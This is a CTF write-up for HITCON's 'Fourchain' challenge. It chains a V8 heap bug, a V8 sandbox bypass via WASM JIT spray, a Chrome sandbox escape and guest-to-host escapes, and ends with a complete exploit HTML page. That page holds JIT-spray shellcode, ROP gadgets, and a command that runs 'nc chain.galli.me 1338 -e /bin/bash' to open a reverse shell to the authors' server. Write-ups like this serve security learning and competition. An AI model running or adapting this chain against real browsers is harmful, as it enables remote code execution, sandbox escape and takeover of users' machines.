# Fourchain - One For All

**Authors:** [Nspace](https://twitter.com/_MatteoRizzo), [gallileo](https://twitter.com/galli_leo_)

**Tags:** pwn, browser, v8, linux, virtualbox

**Points:** 500

> One challenge for all the vulnerabilities.
> 
> All these years of training has lead to this moment.
> 
> Show us who's the best pwner in the world !

The last challenge in the series is about chaining together the four bugs. The challenge runs Linux with the vulnerable module inside the patched Virtualbox, and runs the patched Chromium with both bugs inside this VM. We can provide the URL of our own webpage and the challenge will open it in the patched Chromium. We have to get the flag which is outside the VM.

Escaping the VM once we have a root shell inside is easy, we only need to load the exploit module from the VM escape challenge. Getting a root shell from an unsandboxed unprivileged shell is also easy because we can reuse the kernel exploit from the kernel challenge. The only part that is slightly more problematic is chaining the renderer compromise with the browser sandbox escape.

The sandbox escape needs to send Mojo messages to the browser process to interact with the vulnerable IPC service. The easiest way to do that from a compromised renderer is to enable MojoJS. Using MojoJS also means that we can reuse the exploit from the sandbox escape part unmodified which is nice because it saves us some work. There is a well-documented way to enable Mojo in a compromised renderer with arbitrary R/W, described by Mark Brand in a [Project Zero bug](https://bugs.chromium.org/p/project-zero/issues/detail?id=1755). I reused [the code](https://github.com/google/google-ctf/blob/master/2021/quals/pwn-fullchain/healthcheck/chromium_exploit.html#L122) that I wrote for the Full Chain challenge at Google CTF 2021 for this.

Now the only thing we need is arbitrary read and write in the renderer. Unfortunately we had cheesed the V8 challenge by loading the flag into the sandboxed heap with `Realm.eval` instead of actually bypassing the V8 sandbox. This was good enough for that challenge where we only had to read a file, but it won't work here. We need an actual bypass for the V8 sandbox.

## Uncheesing the V8 Exploit

Earlier this year DiceCTF had [a challenge](https://ctftime.org/task/18826) where players had to find bypasses for the V8 sandbox. The sandbox is now enabled by default in V8 but it's still pretty new and there are many bypasses that haven't been fixed yet. Funnily enough I had discovered the `Realm.eval` cheese when attempting to solve that challenge near the end of the CTF but I couldn't use it because the flag was located at an unguessable path. I remembered that Kylebot from Shellphish had published [a writeup](https://blog.kylebot.net/2022/02/06/DiceCTF-2022-memory-hole/) for that challenge so I started by reading it.

Kylebot's bypass uses WASM and overwrites `imported_mutable_globals` in a `WasmInstance` object to get arbitrary read and write. Unfortunately this bypass [has been patched out](https://source.chromium.org/chromium/_/chromium/v8/v8.git/+/5c152a0f7b53ad24c4e103daad3cbfa94d51c29d) and doesn't work anymore in the version of V8 used in this challenge. Even then I still thought I should take a look at the `WasmInstance` because it had a lot of native pointers in Kylebot's writeup:

```py
0x12af00197ff5 <Instance map = 0x12af00195f89>
pwndbg> tele 0x12af00197ff4
00:0000│  0x12af00197ff4 ◂— 0x225900195f89
01:0008│  0x12af00197ffc ◂— 0x225900002259 /* 'Y"' */
02:0010│  0x12af00198004 ◂— 0x34c900002259 /* 'Y"' */
03:0018│  0x12af0019800c ◂— 0x34c9
04:0020│  0x12af00198014 ◂— 0x180010000000000
05:0028│  0x12af0019801c ◂— 0x10000
06:0030│  0x12af00198024 —▸ 0x5555569b5b60 —▸ 0x7ffffff07c60 ◂— 0x7ffffff07c60
07:0038│  0x12af0019802c —▸ 0x555556a1ba70 ◂— 0x500000000
08:0040│  0x12af00198034 ◂— 0x0
09:0048│  0x12af0019803c ◂— 0x0
0a:0050│  0x12af00198044 ◂— 0xffffffffff000000
0b:0058│  0x12af0019804c —▸ 0x5555569b5b40 —▸ 0x12af00000000 ◂— 0xb000
0c:0060│  0x12af00198054 —▸ 0x3a0e9c984000 ◂— jmp 0x3a0e9c984640 /* 0xcccccc0000063be9 */
0d:0068│  0x12af0019805c —▸ 0x5555569c2a48 —▸ 0x12af0005213c ◂— 0x5bd88000022c9
0e:0070│  0x12af00198064 —▸ 0x5555569c2a40 —▸ 0x12af000497e4 ◂— 0x0
0f:0078│  0x12af0019806c —▸ 0x5555569c2a68 —▸ 0x12af001c0000 ◂— 0x0
10:0080│  0x12af00198074 —▸ 0x5555569c2a60 —▸ 0x12af00198224 ◂— 0x0
11:0088│  0x12af0019807c —▸ 0x5555569b5b50 —▸ 0x7ffffff07c60 ◂— 0x7ffffff07c60
12:0090│  0x12af00198084 —▸ 0x5555569d7889 ◂— 0x100000000
13:0098│  0x12af0019808c —▸ 0x555556a270c0 ◂— 0x7fff001b7740
14:00a0│  0x12af00198094 ◂— 0x34c9000034c9
15:00a8│  0x12af0019809c ◂— 0x4958d000034c9
16:00b0│  0x12af001980a4 ◂— 0x182dad0004975d
17:00b8│  0x12af001980ac ◂— 0x23e100197fb1
```

Most of the pointers appear to be sandboxed now but there are still a few that are not. I started experimenting by overwriting each of those with 0x41414141 in GDB before calling into the wasm code and got some crashes. The most interesting one was from overwriting the pointer at offset 0x60 because it gave us RIP control:

```py
Thread 1 "d8" received signal SIGSEGV, Segmentation fault.
0x0000000041414141 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────
*RAX  0x13371337
*RBX  0x7fffffffd400 —▸ 0x7fffffffd420 ◂— 0xe
*RCX  0x555555f55631 ◂— mov rax, rbx
*RDX  0x13381338
*RDI  0x555556a18620 —▸ 0x555556a0fbe0 ◂— 0x0
*RSI  0x1ccc00198735 ◂— 0x590000225900195f
*R8   0x3e359ccb128
*R9   0x1ccc00198735 ◂— 0x590000225900195f
*R10  0x7ffff7fbd080
*R11  0x7ffff7fbd090
*R12  0x2
 R13  0x5555569b2420 —▸ 0x1ccc00000000 ◂— 0xb000
 R14  0x1ccc00000000 ◂— 0xb000
*R15  0x41414141
*RBP  0x7fffffffd428 —▸ 0x7fffffffd508 —▸ 0x7fffffffd560 —▸ 0x7fffffffd588 —▸ 0x7fffffffd5f0 ◂— ...
*RSP  0x7fffffffd3b8 —▸ 0x5554dff10256 ◂— lea rsp, [rbp - 0x48]
*RIP  0x41414141
───────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────
Invalid address 0x41414141
```

This is very interesting because even though we can't directly overwrite the generated machine code (which is RWX) we can still place some controlled data there by embedding it in immediates and then jumping into the middle of the immediate by overwriting this pointer (JIT spray attack).

Interestingly, Kylebot notes in his writeup that

> After a few trials, I still couldn’t let V8 to dereference this pointer. After following the trace, @adamd and I found out that the real pointer used for invoking the shellcode resides on ptmalloc heap, which is outside of the cage.

It seems that this might have changed in newer versions of V8 and that this attack is now possible.

The gist of the attack is that we will compile a WASM function similar to this 

```c
int a(unsigned long x, unsigned long y) { 
    double g1 = 1.4501798452584495e-277;
    double g2 = 1.4499730218924257e-277;
    double g3 = 1.4632559875735264e-277;
    double g4 = 1.4364759325952765e-277;
    double g5 = 1.450128571490163e-277;
    double g6 = 1.4501798485024445e-277;
    double g7 = 1.4345589834166586e-277;
    double g8 = 1.616527814e-314;
    
    return g1 + g2 + g3 + g4 + g5 + g6 + g7 + g8;
}
```

and choose the floating-point values so that their binary encoding is also valid machine code. By jumping into the next imediate when we run out of space we can construct an arbitrarily-long instruction sequence. And since V8's WASM compiler is deterministic we just have to add an offset to the pointer we were just overwriting to execute our sprayed shellcode.

By inspection in GDB we can see that the calling convention that V8 uses for WASM is register-based with 32-bit integer arguments passed in `eax`, `edx`, `ecx` and integer values are returned in `eax`. The following shellcode gives us arbitrary read and write outside of the sandbox [^1]:

```nasm
sal rdx, 32
or rax, rdx
mov eax, dword ptr [rax]
ret

sal rax, 32
or rdx, rax
mov dword ptr [rdx], ecx
ret
```

[^1]: The reason why we use rdx, rax to read but rax, rdx to write is that if the same floating-point constant is used twice in the function, the compiler will emit a load from memory instead of an immediate. So we can't use the same sequence of instructions twice.

All seems good now and after figuring out the offsets we can get our arbitrary read and write:

```py
Thread 1 "d8" received signal SIGSEGV, Segmentation fault.
0x0000303536423736 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────
 RAX  0x0
*RBX  0x5554dff173b8 ◂— cmp eax, dword ptr [r13 + 0x220]
*RCX  0x42424242
*RDX  0x41414141
*RDI  0x555556a1f080 —▸ 0x555556a1f030 ◂— 0x0
*RSI  0x3ae300199219 ◂— 0x590000225900195f
*R8   0x4011f608d37
*R9   0x7fffffffd348 —▸ 0x3ae300199315 ◂— 0xc90019930100002f /* '/' */
*R10  0x7ffff7fbd080
*R11  0x7ffff7fbd090
*R12  0x2
*R13  0x5555569b2420 —▸ 0x3ae300000000 ◂— 0xb000
*R14  0x3ae300000000 ◂— 0xb000
*R15  0x303536423710 ◂— shl rax, 0x20 /* 0xbeb909020e0c148 */
*RBP  0x7fffffffd390 —▸ 0x7fffffffd420 —▸ 0x7fffffffd508 —▸ 0x7fffffffd560 —▸ 0x7fffffffd588 ◂— ...
*RSP  0x7fffffffd310 —▸ 0x5554dff10256 ◂— lea rsp, [rbp - 0x48]
*RIP  0x303536423736 ◂— mov dword ptr [rdx], ecx /* 0xbeb909090c30a89 */
───────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────
 ► 0x303536423736    mov    dword ptr [rdx], ecx
   0x303536423738    ret
```

Except, there is a slight problem. The code pointer that we are overwriting only seems to be used once, the first time a function in that WASM instance is called. After that it's not used anymore and the JIT spray doesn't work. This probably has to do with lazy compilation. Creating a new WASM instance every time we want to read or write *almost* works, but not quite. It seems that V8 *also* has a cache of compiled WASM bytecode, so if we attempt to create two completely different WASM modules that use the same bytecode it will only compile the code once, so the JIT spray attack only works on the first.

Our solution was simply to change the WASM bytecode every time we create a new instance. We just selected some byte that didn't appear to have an effect on the shellcode when changed and wrote some JavaScript that increments that byte every time we create a new WASM instance. Very hacky but it works.

Now that we have arbitrary R/W in the renderer process we just need to leak the base of the `chrome` binary and enable MojoJS. There are probably tons of ways to do this, we used a pointer inside the WASM code page.

After toggling the MojoJS flag we just have to reload the page and we will have MojoJS, so we can run the Sandbox exploit from before.

The final exploit html can be found at the end of this page.

## GUI Troubles

Since we just had too much fun solving these challenges, we decided to go all out for the writeup and make the exploit work while running everything with a GUI (i.e. like a person normally would).
In theory of course, this should have been a cake walk and it would only require us to install the GUI packages everywhere and set the corresponding settings / flags.
Unfortunately, it was not that easy.

Installing the GUI was already quite tricky and I had to setup a completely new VM for it, since installing it on my droplet resulted in all network connections being dropped.
This proved to be a bit tricky, due to wanting to use a VM in VM setup (so I don't accidentally mess up my actual system).
This meant I had to use nested virtualization which should be supported by VirtualBox out of the box.
My host OS was Windows, since that was the machine I had lying around with nested virtualization supported.
It took many restarts and convincing Windows that I did not need any kind of safety features to disable Hyper-V and get nested virtualization in VirtualBox working.
Now I only had to get Chrome working with a GUI, which turned out to be a bit of a pain as well.
The build provided by the challenge authors unfortunately did not have the necessary resources and e.g. the crash handler.
Thankfully, Nspace did a local compile of the patched Chrome for local debugging and I was able to get the GUI working by copying over random files from his build.

Once that was out of the way, I could finally start.
After some very minor tweaking, the last two steps worked quite well again, even with the GUI.
However, the first two stages were not working at all.
The first stage, was failing to leak the code pointer and it turns out that the read outside the V8 sandbox was broken.
I wasted quite some time here until I finally (grudgingly) installed gdb in the inner VM and attached to chrome.
It turns out, that my new setup was using different instructions (likely due to being an AMD CPU) for compiling the WASM code and hence the offset used had to change.
Once that was fixed, the first stage was working again.

The second stage was still broken though and would always crash at the same place with similar register contents:

```cpp
Received signal 11 <unknown> 000000000000
#0 0x55fa415d15b2 base::debug::CollectStackTrace()
#1 0x55fa41537783 base::debug::StackTrace::StackTrace()
#2 0x55fa415d10d1 base::debug::(anonymous namespace)::StackDumpSignalHandler()
#3 0x7f2179098140 (/usr/lib/x86_64-linux-gnu/libpthread-2.31.so+0x1313f)
#4 0x55fa3fd520e4 content::SandboxImpl::Pour()
#5 0x55fa41584f81 base::TaskAnnotator::RunTaskImpl()
#6 0x55fa4159d2cd base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl()
#7 0x55fa4159cbbf base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork()
#8 0x55fa4159da55 base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork()
#9 0x55fa415f8193 base::MessagePumpEpoll::Run()
#10 0x55fa4159ddab base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run()
#11 0x55fa41563db9 base::RunLoop::Run()
#12 0x55fa415bd098 base::Thread::Run()
#13 0x55fa3f6d8a60 content::BrowserProcessIOThread::IOThreadRun()
#14 0x55fa415bd1b7 base::Thread::ThreadMain()
#15 0x55fa415e494f base::(anonymous namespace)::ThreadFunc()
#16 0x7f217908cea7 start_thread
#17 0x7f21780afa2f clone
  r8: 00001b6802012300  r9: 00007f217080e06f r10: 0000000000010001 r11: 0000000000000001
 r12: 00001b68010c7c20 r13: 0000000000000800 r14: 00001b68010c6c00 r15: efefefefefefefef
  di: 000055fa47c6ccc8  si: 00001b6801f32300  bp: 00007f217080e140  bx: 00001b6801cc8000
  dx: 0000000000000800  ax: 00001b6802012b20  cx: 0000000000000000  sp: 00007f217080e0f0
  ip: 000055fa3fd520e4 efl: 0000000000010282 cgf: 002b000000000033 erf: 0000000000000000
 trp: 000000000000000d msk: 0000000000000000 cr2: 0000000000000000
[end of stack trace]
Segmentation fault
```

Looking at the assembly, the culprit was R15.
I compared the crashlog to one without GUI and there the exploit would always succeed or R15 was null or `0x20`.
I realized, that when the GUI was enabled, there must be some UAF detection happening, by memsetting free'd chunks to `0xef`.
After scouring the chromium codebase for a few hours (and wasting a lot of time trying to make it work with different timings of the race), I finally figured out that it is their new partition allocator:

```cpp
  // TODO(keishi): Add PA_LIKELY when brp is fully enabled as |brp_enabled| will
  // be false only for the aligned partition.
  if (brp_enabled()) {
    auto* ref_count = internal::PartitionRefCountPointer(slot_start);
    // If there are no more references to the allocation, it can be freed
    // immediately. Otherwise, defer the operation and zap the memory to turn
    // potential use-after-free issues into unexploitable crashes.
    if (PA_UNLIKELY(!ref_count->IsAliveWithNoKnownRefs() &&
                    brp_zapping_enabled()))
      internal::SecureMemset(object, internal::kQuarantinedByte,
                             slot_span->GetUsableSize(this));
```

I did not figure out whether this is just not enabled when running with `--headless` or the GUI just causes the memset to happen due to other factors.
In the end, I decided to just disable the new allocator with a command line flag[^4].

With all of that fixed, the exploit finally worked when running under a GUI and we were able to capture this glorious video :P (I recommend you turn on sound):

<video width="100%" controls="controls">
  <source src="./img/fourchain_gui.mp4">
</video>

[^4]: Yeah this is kinda cheating, but then again, the challenge was not made with this in mind and I also had to finish this writeup at some point :P. Also I forgot the command line flag, so if you came here looking for that, sorry :/.


## Final Exploit HTML

```html
<html>
<head>

<script src="http://chain.galli.me:8080/mojo/mojo_bindings.js"></script>
<script src="http://chain.galli.me:8080/mojo/third_party/blink/public/mojom/sandbox/sandbox.mojom.js"></script>

<script>
const server_url = 'http://chain.galli.me:8080'
let printbuf = [];
function print(msg) {
  printbuf.push(msg);
}

let f64view = new Float64Array(1);
let u8view = new Uint8Array(f64view.buffer);
let u64view = new BigUint64Array(f64view.buffer);
let i32view = new Int32Array(f64view.buffer);
let u32view = new Uint32Array(f64view.buffer);

function d2i(x) {
    f64view[0] = x;
    return u64view[0];
}

function i2d(x) {
    u64view[0] = x;
    return f64view[0];
}

function s2u(x) {
    i32view[0] = x;
    return u32view[0];
}

function hex(x) {
  return `0x${x.toString(16)}`;
}

function assert(x, msg) {
  if (!x) {
    throw msg;
  }
}

async function renderer() {
  let hole = [].hole();
  let map = new Map(); // len = 0, 2 buckets
  map.set(1, 1); // len = 1, 2 buckets
  map.set(hole, 1); // len = 2, 2 buckets
  map.delete(hole); // len = 2, 2 buckets
  map.delete(hole); // len = 0x00048b55, 2 buckets, 2 deleted, pointed to map has len = 0, no deleted, 2 buckets
  map.delete(1); // len = 0x00048b55, 2 buckets, 2 deleted, points to another map, points to something with len = -1
  let a = [];
  map.set(0x10, -1); // set the number of buckets to 0x10

  a.push(1.1);

  let b = [];
  map.set(b, 1337); // overwrite the length of the array

  let c = new Uint32Array(16);
  a[23] = i2d(0x1337133700000000n);


  let d = [a];
  let e = [d];

  let d_addr = c[46] - 1;

  a[24] = i2d(0n);
  a[25] = i2d(0n);

  let d_elements = c[d_addr / 4 + 2] - 1;

  function cageAddressOf(obj) {
      d[0] = obj;
      return c[d_elements / 4 + 2] - 1;
  }

  var global = new WebAssembly.Global({value:'i64', mutable:true}, 0n);
  var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,135,128,128,128,0,1,96,2,127,127,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,101,109,101,0,0,10,224,128,128,128,0,1,218,128,128,128,0,0,32,0,184,68,55,19,55,19,55,19,55,19,160,32,1,184,160,68,72,193,226,32,144,144,235,11,160,68,72,9,208,144,144,144,235,11,160,68,139,0,144,144,144,144,235,11,160,68,195,144,144,144,144,144,235,11,160,68,72,193,224,32,144,144,235,11,160,68,72,9,194,144,144,144,235,11,160,68,137,10,195,144,144,144,235,11,160,171,11]);
  var wasm_mod = new WebAssembly.Module(wasm_code);
  var wasm_instance = new WebAssembly.Instance(wasm_mod, {js: {global}});
  let f = wasm_instance.exports.meme;

  f(0x13371337, 0x13381338);
  const code_addr = BigInt(c[cageAddressOf(wasm_instance) / 4 + 24]) | (BigInt(c[cageAddressOf(wasm_instance) / 4 + 25]) << 32n);

  let i = 0;

  function makeInstance() {
      var global2 = new WebAssembly.Global({value:'i64', mutable:true}, 0n);
      var wasm_code2 = new Uint8Array([0,97,115,109,1,0,0,0,1,136,128,128,128,0,1,96,3,127,127,127,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,142,128,128,128,0,2,6,109,101,109,111,114,121,2,0,1,97,0,0,10,238,128,128,128,0,1,232,128,128,128,0,0,32,0,184,68,55,19,55,19,55,19,55,19,160,32,1,184,160,32,2,184,160,68,72,139,9,56,192,144,116,6,160,68,104,0,16,0,0,144,116,6,160,68,94,72,49,255,56,192,116,6,160,68,104,255,15,0,0,95,116,6,160,68,72,247,215,144,144,144,116,6,160,68,72,33,207,56,192,144,116,6,160,68,42,240,83,106,10,88,116,6,160,68,81,15,5,195,0,0,0,1,160,171,11]);
      wasm_code2[wasm_code2.length - 4] = i;
      i++;

      var wasm_mod2 = new WebAssembly.Module(wasm_code2);
      var wasm_instance2 = new WebAssembly.Instance(wasm_mod2, {js: {global2}});
      return wasm_instance2;
  }

  function read32(addr) {
      let wasm_instance2 = makeInstance()
      let f2 = wasm_instance2.exports.a;

      const shellcode_addr = code_addr + 0x680n + 0x25n + 0x1fn;
      c[cageAddressOf(wasm_instance2) / 4 + 24] = Number(shellcode_addr & 0xffffffffn);
      c[cageAddressOf(wasm_instance2) / 4 + 25] = Number((shellcode_addr >> 32n) & 0xffffffffn);
      return s2u(f2(Number(addr & 0xffffffffn), Number((addr >> 32n) & 0xffffffffn)));
  }

  function write32(addr, val) {
      let wasm_instance2 = makeInstance()
      let f2 = wasm_instance2.exports.a;

      const shellcode_addr = code_addr + 0x680n + 0x25n + 0x6bn;
      c[cageAddressOf(wasm_instance2) / 4 + 24] = Number(shellcode_addr & 0xffffffffn);
      c[cageAddressOf(wasm_instance2) / 4 + 25] = Number((shellcode_addr >> 32n) & 0xffffffffn);
      f2(Number((addr >> 32n) & 0xffffffffn), Number(addr & 0xffffffffn), val);
  }

  function read64(addr) {
    return BigInt(read32(addr)) | (BigInt(read32(addr + 4n)) << 32n);
  }

  let leakInstance = makeInstance();
  let codePointer = BigInt(c[cageAddressOf(leakInstance) / 4 + 24]) | (BigInt(c[cageAddressOf(leakInstance) / 4 + 25]) << 32n);
  let textPointer = read64(codePointer + 0x148n)
  print(`Code pointer: ${hex(codePointer)}`);
  print(`Text pointer: ${hex(textPointer)}`);

  let chrome_base = textPointer - 0x590ce00n;

  // From https://github.com/google/google-ctf/blob/master/2021/quals/pwn-fullchain/healthcheck/chromium_exploit.html#L122
  // nm chrome | grep g_frame_map | awk '{print $1}'
  const g_frame_map_offset = 0x000000000e34d168n;
  // Disassemble content::RenderFrameImpl::EnableMojoJsBindings
  const enable_mojo_js_bindings_offset = 0x448n;

  // g_frame_map is a LazyInstance<FrameMap>, i.e. a FrameMap preceded by a
  // pointer to the FrameMap.
  let frame_map_ptr = chrome_base + g_frame_map_offset;
  let g_frame_map = read64(frame_map_ptr);
  assert(g_frame_map === frame_map_ptr + 8n, 'failed to find g_frame_map');
  print(`g_frame_map: ${hex(g_frame_map)}`);

  // FrameMap is a std::map<blink::WebFrame*, RenderFrameImpl*>, which is
  // implemented as a red-black tree in libc++. We'll assume that there is
  // only one element in the map. The first 8 bytes in the std::map point to
  // the (only) node.
  // The layout of a node is as follows:
  // 0:  p64(left)
  // 8:  p64(right)
  // 16: p64(parent)
  // 24: p64(is_black) (yes this is a boolean but it takes 64 bits)
  // 32: key (in our case blink::WebFrame*)
  // 40: value (in our case RenderFrameImpl*) <-- what we want
  let g_frame_map_node = read64(g_frame_map);
  print(`g_frame_map_node: ${hex(g_frame_map_node)}`);
  let render_frame = read64(g_frame_map_node + 40n);
  print(`render_frame: ${hex(render_frame)}`);

  // This is a bool in RenderFrameImpl that controls whether JavaScript has
  // access to the MojoJS bindings.
  let enable_mojo_js_bindings_addr = render_frame + enable_mojo_js_bindings_offset;
  write32(enable_mojo_js_bindings_addr, read32(enable_mojo_js_bindings_addr) | 1);
  // We will have mojo after reloading the page, so do that
  window.location.reload();
}

async function sbx() {
  function newClient() {
    let iface = new blink.mojom.SandboxPtr();
    Mojo.bindInterface(blink.mojom.Sandbox.name, mojo.makeRequest(iface).handle);

    return iface;
  }

  let fake = newClient();
  const heap_leak = (await fake.getHeapAddress()).addr;

  const text_leak = (await fake.getTextAddress()).addr;

  print(`Text leak: ${hex(text_leak)}`);
  const chrome_base = BigInt(text_leak) - 0x627fc20n;
  print(`Chrome base: ${hex(chrome_base)}`);

  const syscall = chrome_base + 0x0d8decafn; // syscall;
  const move_stack = chrome_base + 0x08ff9a59n; // add rsp, 0x28; ret;
  const pop_rdi = chrome_base + 0x0d8e655bn; // pop rdi; ret
  const pop_rsi = chrome_base + 0x0d8cdf7cn; // pop rsi; ret;
  const pop_rdx = chrome_base + 0x0d86e112n; // pop rdx; ret;
  const pop_rax = chrome_base + 0x0d8e64f4n; // pop rax; ret;

  let boxed_mem = BigInt(heap_leak) + 0x18n;
  let fake_object = new BigUint64Array(0x800 / 8);

  let prog_addr = boxed_mem - 7n;
  let prog_arg = boxed_mem - 7n + 15n * 8n;
  let prog_arg2 = prog_arg + 8n;

  fake_object.fill(0x4141414141414141n);
  fake_object[0] = 0x68732f6e69622fn; // /bin/sh
  fake_object[1] = prog_addr;
  fake_object[2] = prog_arg;
  fake_object[3] = prog_arg2;
  fake_object[4] = 0n;
  fake_object[5] = chrome_base + 0x0590cc53n; // mov rsp, [rdi]; mov rbp, [rdi+8]; mov dword ptr [rdi+0x20], 0; jmp qword ptr [rdi+0x10];

  fake_object[6] = pop_rdi;
  fake_object[7] = prog_addr;
  fake_object[8] = pop_rsi;
  fake_object[9] = boxed_mem + 8n - 7n;
  fake_object[10] = pop_rdx;
  fake_object[11] = 0n;
  fake_object[12] = pop_rax;
  fake_object[13] = 59n;
  fake_object[14] = syscall;

  fake_object[15] = 0x632dn; // -c\x00\x00\x00

  // nc chain.galli.me 1338 -e /bin/bash
  fake_object[16] = 0x6e6961686320636en; // nc chain
  fake_object[17] = 0x6d2e696c6c61672en; // .galli.m
  fake_object[18] = 0x2d20383333312065n; // e 1338 -
  fake_object[19] = 0x622f6e69622f2065n; // e /bin/b
  fake_object[20] = 0x687361n; // ash\x00\x00\x00

  fake.pourSand(new Uint8Array(fake_object.buffer));
  print(`Fake object at: ${hex(boxed_mem)}`);

  let clients = [];
  for (let i = 0; i < 1000; i++) {
    clients.push(newClient());
  }

  let spray = [];
  for (let i = 0; i < 100; i++) {
    spray.push(newClient());
  }

  let iface = newClient();

  let arg2 = new BigUint64Array(0x1020 / 8);
  arg2.fill(BigInt(boxed_mem) + 1n);
  arg2[0x800 / 8 + 0x818 / 8] = 0n;
  arg2[1 + 0x800 / 8] = 0x12354567n;
  arg2[2 + 0x800 / 8] = move_stack;

  let arg = new Uint8Array(arg2.buffer);

  for (let i = 0; i < clients.length; i++) {
    clients[i].pourSand(arg);
  }

  for (let i = 0; i < 100; i++) {
    iface.pourSand(arg);
    iface.ptr.reset();
    iface = newClient();
  }

  for (let i = 0; i < spray.length; i++) {
    spray[i].pourSand(arg);
  }

  print('done');
}

async function pwn() {
  print('hello world');

  try {
    if (typeof(Mojo) === 'undefined') {
      await renderer();
    } else {
      print(`Got Mojo!: ${Mojo}`);
      await sbx();
    }
  } catch (e) {
    print(`[-] Exception caught: ${e}`);
    print(e.stack);
  }

  fetch(`${server_url}/logs`,{
    method: 'POST',
    body: printbuf.join('\n'),
  });
}

pwn();

</script>
</head>
</html>
```

`hitcon{G00dbY3_1_4_O_h3LL0_Pwn_2_Own_BTW_vB0x_Y_U_N0_SM3P_SM4P_??!!}`

## Table of Contents

- [Prologue](./fourchain-prologue): Introduction
- [Chapter 1: Hole](./fourchain-hole): Using the "hole" to pwn the V8 heap and some delicious Swiss cheese.
- [Chapter 2: Sandbox](./fourchain-sandbox): Pwning the Chrome Sandbox using `Sandbox`.
- [Chapter 3: Kernel](./fourchain-kernel): Chaining the Cross-Cache Cred Change
- [Chapter 4: Hypervisor](./fourchain-hv): Lord of the MMIO: A Journey to IEM
- **[Chapter 5: One for All](./fourchain-fullchain) (You are here)**
- [Epilogue](./fourchain-epilogue): Closing thoughts